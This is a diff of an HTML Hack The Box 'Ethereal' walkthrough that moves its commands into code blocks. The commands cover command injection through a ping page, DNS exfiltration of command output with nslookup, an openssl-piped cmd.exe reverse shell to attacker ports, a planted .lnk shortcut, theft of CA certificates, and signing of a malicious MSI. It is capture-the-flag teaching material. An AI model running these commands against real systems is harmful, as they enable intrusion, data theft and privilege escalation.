@@ -191,58 +191,71 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <h2 id="blind-rce">Blind RCE</h2>
 <p><br> Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. 
 <img src="/images/hackthebox/ethereal/32.png" alt="">
-<br> Now we can try to bypass that and inject system commands using <code class="highlighter-rouge">&amp;</code> or <code class="highlighter-rouge">|</code> , but we don’t get any output. I also tried to host <code class="highlighter-rouge">nc.exe</code> on a python http server and used <code class="highlighter-rouge">certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder <code class="highlighter-rouge">responder -I tun0</code> then did this <code class="highlighter-rouge">10.10.xx.xx &amp; nslookup test 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/33.png" alt="">
+<br> Now we can try to bypass that and inject system commands using <code class="highlighter-rouge">&amp;</code> or <code class="highlighter-rouge">|</code> , but we don’t get any output. I also tried to host <code class="highlighter-rouge">nc.exe</code> on a python http server and used <code class="highlighter-rouge">certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I tun0` then did this `10.10.xx.xx &amp; nslookup test 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/33.png" alt="">
 <br> I finally got something :
 <img src="/images/hackthebox/ethereal/34.png" alt="">
-<br> We can try to execute a system command and get the output by doing this :
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/35.png" alt="">
+<br> We can try to execute a system command and get the output by doing this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/35.png" alt="">
 <br> This is executing <code class="highlighter-rouge">whoami</code> then taking the output and doing nslookup with the output to our ip :
 <img src="/images/hackthebox/ethereal/36.png" alt="">
 <br> We get <code class="highlighter-rouge">etherealalan</code> and that’s unusual as we expected <code class="highlighter-rouge">ethereal\alan</code>.
-<br> We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html" target="_blank" rel="noopener noreferrer">read this</a> if you don’t understand some of the <code class="highlighter-rouge">for</code> commands that we will use.
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/37.png" alt="">
+<br> We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html" target="_blank" rel="noopener noreferrer">read this</a> if you don’t understand some of the <code class="highlighter-rouge">for</code> commands that we will use.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/37.png" alt="">
 <br>
 <br>
 <img src="/images/hackthebox/ethereal/38.png" alt="">
 <br> So the current directory is <code class="highlighter-rouge">c:\windows\system32\inetsrv</code>
-<br> We also need to know the users on the box :
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/39.png" alt="">
+<br> We also need to know the users on the box :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/39.png" alt="">
 <br> We have 5 users on the box <code class="highlighter-rouge">alan</code> , <code class="highlighter-rouge">jorge</code> , <code class="highlighter-rouge">Public</code> , <code class="highlighter-rouge">rupal</code> and <code class="highlighter-rouge">Administrator</code>. We are executing commands as <code class="highlighter-rouge">alan</code>
-<br> Next thing to look at is the installed programs :
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx</code> 
-<img src="/images/hackthebox/ethereal/40.png" alt="">
-<br> We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code class="highlighter-rouge">Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> , so we will do this :
-<code class="highlighter-rouge">10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr "Rule Name:" &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt</code>
-<br> Then we will list the contents of <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> 
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/41.png" alt="">
-<br> And we see that we have successfully written into that directory , next step is to read the file :
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/42.png" alt="">
+<br> Next thing to look at is the installed programs :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/40.png" alt="">
+<br> We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code class="highlighter-rouge">Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> , so we will do this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr "Rule Name:" &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt
+</code></pre></div></div>
+<p><br> Then we will list the contents of <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/41.png" alt="">
+<br> And we see that we have successfully written into that directory , next step is to read the file :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/42.png" alt="">
 <br> It’s only allowing TCP conections to port <code class="highlighter-rouge">73</code> and <code class="highlighter-rouge">136</code> , we saw earlier that openssl was installed on the box , we can create a <code class="highlighter-rouge">SSL/TLS server</code> on these ports and use openssl to make the box connect back to us.
 <br></p>
 <hr>
 
 <h2 id="generating-certs-and-setting-up-the-server">Generating certs and setting up the server</h2>
-<p><br> First step is to generate certificates because we need them to set up the server
-<code class="highlighter-rouge">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes</code>
-<img src="/images/hackthebox/ethereal/43.png" alt="">
-<br> Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 
-<code class="highlighter-rouge">openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]</code>
-<img src="/images/hackthebox/ethereal/44.png" alt="">
+<p><br> First step is to generate certificates because we need them to set up the server :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/43.png" alt="">
+<br> Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/44.png" alt="">
 <br> <a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html" target="_blank" rel="noopener noreferrer">Read more about s_server</a>
 <br> We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.
-<br> Now we need to locate openssl.exe , if we listed the contents of <code class="highlighter-rouge">OpenSSL-v1.1.0</code> in <code class="highlighter-rouge">Program Files (x86)</code> (can also be written <code class="highlighter-rouge">Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568" target="_blank" rel="noopener noreferrer">this</a>) we will get this output :
-<code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx</code>
-<img src="/images/hackthebox/ethereal/45.png" alt="">
+<br> Now we need to locate openssl.exe , if we listed the contents of <code class="highlighter-rouge">OpenSSL-v1.1.0</code> in <code class="highlighter-rouge">Program Files (x86)</code> (can also be written <code class="highlighter-rouge">Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568" target="_blank" rel="noopener noreferrer">this</a>) we will get this output :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/45.png" alt="">
 <br> We see a directory called <code class="highlighter-rouge">bin</code> that’s where <code class="highlighter-rouge">openssl.exe</code> is located so the path is <code class="highlighter-rouge">c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe</code>
-<br> Now everything is ready , in the ping page we will write this :
-<code class="highlighter-rouge">10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136</code>
-<br> Then we will check our server :
+<br> Now everything is ready , in the ping page we will write this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136
+</code></pre></div></div>
+<p><br> Then we will check our server :
 <img src="/images/hackthebox/ethereal/46.png" alt="">
 <br> Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.
 <img src="/images/hackthebox/ethereal/47.png" alt="">
@@ -264,14 +277,16 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <img src="/images/hackthebox/ethereal/53.png" alt="">
 <br> To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :
 <img src="/images/hackthebox/ethereal/54.png" alt="">
-<br> Then on the ping page we will type this :
-<code class="highlighter-rouge">10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 &gt; "C:\Users\Public\Desktop\Shortcuts\rick.lnk"</code>
-<br> We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :
+<br> Then on the ping page we will type this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 &gt; "C:\Users\Public\Desktop\Shortcuts\rick.lnk"
+</code></pre></div></div>
+<p><br> We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :
 <img src="/images/hackthebox/ethereal/55.png" alt="">
 <br>
-<br>
-<code class="highlighter-rouge">del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; dir c:\users\public\desktop\shortcuts</code>
-<img src="/images/hackthebox/ethereal/56.png" alt="">
+<br></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; dir c:\users\public\desktop\shortcuts
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/56.png" alt="">
 <br> Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :
 <img src="/images/hackthebox/ethereal/57.png" alt="">
 <br> With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.
@@ -290,11 +305,13 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <img src="/images/hackthebox/ethereal/60.png" alt="">
 <br> In <code class="highlighter-rouge">DEV</code> there’s a directory called <code class="highlighter-rouge">MSIs</code> and it has a note :
 <img src="/images/hackthebox/ethereal/61.png" alt="">
-<br> So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code class="highlighter-rouge">D:\Certs</code> , <code class="highlighter-rouge">MyCA.cer</code> and <code class="highlighter-rouge">MyCA.pvk</code> , to transfer them to our box we will use <code class="highlighter-rouge">openssl</code> to base64 encode the certs then we can copy and decode on our box.
-<code class="highlighter-rouge">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer</code>
-<img src="/images/hackthebox/ethereal/62.png" alt="">
-<code class="highlighter-rouge">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk</code>
-<img src="/images/hackthebox/ethereal/63.png" alt="">
+<br> So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code class="highlighter-rouge">D:\Certs</code> , <code class="highlighter-rouge">MyCA.cer</code> and <code class="highlighter-rouge">MyCA.pvk</code> , to transfer them to our box we will use <code class="highlighter-rouge">openssl</code> to base64 encode the certs then we can copy and decode on our box.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/62.png" alt=""></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/63.png" alt="">
 <br> Now we will go to a windows box again to create the msi 
 <br></p>
 <hr>
@@ -338,9 +355,10 @@ fail_here
 <img src="/images/hackthebox/ethereal/65.png" alt="">
 <br> Then we will use <code class="highlighter-rouge">light.exe</code> to create the msi file from the wixobject 
 <img src="/images/hackthebox/ethereal/66.png" alt="">
-<br> After that we need tools from microsoft sdk to sign our msi , first we will use <code class="highlighter-rouge">makecert.exe</code> to create new certs from the original certs we got from the box 
-<code class="highlighter-rouge">makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer</code>
-<br> It will ask for a password we will leave it blank for no password protection :
+<br> After that we need tools from microsoft sdk to sign our msi , first we will use <code class="highlighter-rouge">makecert.exe</code> to create new certs from the original certs we got from the box</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer
+</code></pre></div></div>
+<p><br> It will ask for a password we will leave it blank for no password protection :
 <img src="/images/hackthebox/ethereal/67.png" alt="">
 <br>
 <br>
@@ -348,11 +366,13 @@ fail_here
 <br>
 <br>
 <img src="/images/hackthebox/ethereal/69.png" alt="">
-<br> Then we will use <code class="highlighter-rouge">pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files. 
-<code class="highlighter-rouge">pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx</code>
-<br> And finally we will use <code class="highlighter-rouge">signtool.exe</code> to sign the msi with the pfx 
-<code class="highlighter-rouge">signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi</code>
-<img src="/images/hackthebox/ethereal/70.png" alt="">
+<br> Then we will use <code class="highlighter-rouge">pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx
+</code></pre></div></div>
+<p><br> And finally we will use <code class="highlighter-rouge">signtool.exe</code> to sign the msi with the pfx :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi
+</code></pre></div></div>
+<p><img src="/images/hackthebox/ethereal/70.png" alt="">
 <br> Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in <code class="highlighter-rouge">c:\users\public\desktop\shortcuts\</code> because the msi is just executing that lnk. We will put the msi into <code class="highlighter-rouge">D:\DEV\MSIs</code>
 <img src="/images/hackthebox/ethereal/71.png" alt="">
 <br> Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi
